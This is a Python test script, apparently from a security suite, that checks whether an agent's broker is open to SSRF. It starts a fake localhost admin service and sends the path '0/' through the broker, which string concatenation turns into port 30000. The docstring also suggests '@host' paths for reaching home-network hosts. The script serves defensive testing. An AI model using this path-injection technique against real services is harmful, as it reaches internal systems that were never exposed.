"""Attack: SSRF through the agent (reaching a service that was never exposed).

The original agent builds the URL by string concatenation: target_base + path.
With the agent targeting http://127.0.0.1:3000, the path "0/" (no leading "/")
gives "http://127.0.0.1:3000" + "0/" = "http://127.0.0.1:30000/" - another port.

This script starts a "secret" service on 127.0.0.1:30000 (e.g. an admin panel)
and tries to read it from outside through the broker.

Note: urllib does not understand "user@host" URLs, so "@192.168.1.1/" fails
with the original agent. If the agent switched to requests/httpx, the same bug
would allow reaching any host in the home network.

Requires the agent to target http://127.0.0.1:3000 (the default).
Usage: python attack_ssrf.py [--http-url http://127.0.0.1:8080] [--secret-port 30000] [--path 0/]
Exit code: 0 = protected, 1 = vulnerable.
"""
import argparse
import http.server
import socket
import sys
import threading
import urllib.parse

SECRET = b"<h1>Admin panel</h1><p>SECRET: password = admin123</p>"


class SecretHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(SECRET)))
        self.end_headers()
        self.wfile.write(SECRET)

    def log_message(self, *args):
        print("[!] The secret service received a request - the agent went where it should not!")


def main(http_url, secret_port, path):
    srv = http.server.HTTPServer(("127.0.0.1", secret_port), SecretHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    # Raw request over a socket - curl or a browser would "fix" such a path.
    u = urllib.parse.urlsplit(http_url)
    raw = f"GET {path} HTTP/1.1\r\nHost: x\r\n\r\n".encode()
    with socket.create_connection((u.hostname, u.port or 80), timeout=15) as s:
        s.sendall(raw)
        resp = b""
        while chunk := s.recv(4096):
            resp += chunk
    srv.shutdown()

    print("--- Broker response ---")
    print(resp.decode(errors="replace"))
    leaked = b"SECRET" in resp
    print("[!] Attack succeeded: a service that was never exposed was read from outside." if leaked
          else "[+] Attack failed: the secret did not leak.")
    print(f"RESULT: SSRF ({path!r}): {'VULNERABLE' if leaked else 'PROTECTED'}")
    return 1 if leaked else 0


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--http-url", default="http://127.0.0.1:8080")
    p.add_argument("--secret-port", type=int, default=30000)
    p.add_argument("--path", default="0/")
    a = p.parse_args()
    sys.exit(main(a.http_url, a.secret_port, a.path))
